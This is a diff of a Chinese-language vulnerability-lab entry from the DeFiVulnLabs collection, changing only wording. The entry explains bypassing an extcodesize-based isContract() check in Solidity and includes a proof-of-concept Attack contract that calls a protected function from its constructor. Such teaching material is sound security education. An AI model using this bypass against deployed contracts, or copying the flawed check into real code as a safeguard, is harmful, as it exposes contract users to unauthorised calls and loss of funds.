@@ -2,7 +2,7 @@
 [Bypasscontract.sol](https://github.com/SunWeb3Sec/DeFiVulnLabs/blob/main/src/test/Bypasscontract.sol)  
 **名称：** 绕过isContract()验证  
 **描述：**   
-攻击者只需要在智能合约的构造函数中编写代码，就可以绕过是否为智能合约的检测机制。  
+攻击者只需要在智能合约的构造函数中编写代码，就可以绕过判断是否为智能合约的检测机制。  
 
 
 **参考：**  
@@ -13,7 +13,8 @@ https://www.infuy.com/blog/bypass-contract-size-limitations-in-solidity-risks-an
 ```
 contract Target {
     function isContract(address account) public view returns (bool) {
-        // 此方法依赖于extcodesize，它为构造函数中的合约返回0，因为代码仅在构造函数执行结束时存储。
+        // 此方法使用了EVM的‘extcodesize’汇编指令，来检查给定地址处的代码大小
+        // 对于在构造过程中的合约，这个方法可能会返回0，因为在构造函数执行的末尾才会存储代码。
         uint size;
         assembly {
             size := extcodesize(account)
@@ -53,25 +54,25 @@ function testBypassContractCheck() public {
 
 // 为攻击Target合约而创建的攻击合约。
 contract Attack {
-    // 公共布尔值，表示此合约本身是否是合约
+    // 表示当前合约本身是否是一个合约
     bool public isContract;
 
-    // 公共地址变量，用于存储此合约的地址。
+    // 用于存储当前合约的地址。
     address public addr;
 
-    // 只在创建Attack合约时，触发一次的构造函数。
-    // 它将Target合约的地址作为参数。
+    // 当Attack合约被创建时，构造函数会被触发。
+    // 它接受一个目标合约的地址作为参数。
     constructor(address _target) {
-        // 调用目标合约的isContract()函数，传递本合约的地址。
+        // 调用目标合约的isContract()函数，传递当前合约的地址。
         // 这通常是Target合约中的安全检查，以查看调用方是否为合约。
         // 但是由于这个调用是在构造函数中进行的，isContract()中的extcodesize检查将返回false。
         isContract = Target(_target).isContract(address(this));
 
-        // 将此合约的地址分配给addr变量。
+        // 将当前合约的地址分配给addr变量。
         addr = address(this);
 
         // 调用Target合约的protected()函数，该函数可能拒绝合约调用。
-        // 但是由于isContract()检查中的漏洞，此调用成功。
+        // 然而，由于构造函数中的isContract()检查的漏洞，这次调用实际上是成功的。
         Target(_target).protected();
     }
 }
